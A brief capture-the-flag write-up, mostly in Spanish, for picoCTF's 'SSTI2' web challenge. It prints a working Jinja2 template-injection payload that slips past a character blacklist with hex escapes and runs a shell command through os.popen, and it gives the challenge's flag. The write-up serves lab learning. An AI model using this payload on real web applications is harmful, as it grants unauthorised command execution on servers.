# SSTI2

## Description

I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :) I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:59035/)!

## Hints

* Server Side Template Injection
* Why is blacklisting characters a bad idea to sanitize input?

## Solución

Primero iniciamos nuestra instancia y entramos al link proporcionado, una vez dentro buscamos `pyjail ssti` en nuestro navegador y seleccionamos el primer sitio web, y buscamos el siguiente comando y lo pegamos en el link que se nos proporciono de la instancia y con esto nos dara nuestra respectiva flag:
`{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}`

### Respuesta: picoCTF{sst1_f1lt3r_byp4ss_5b0b2f79}

## Referencias:
https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/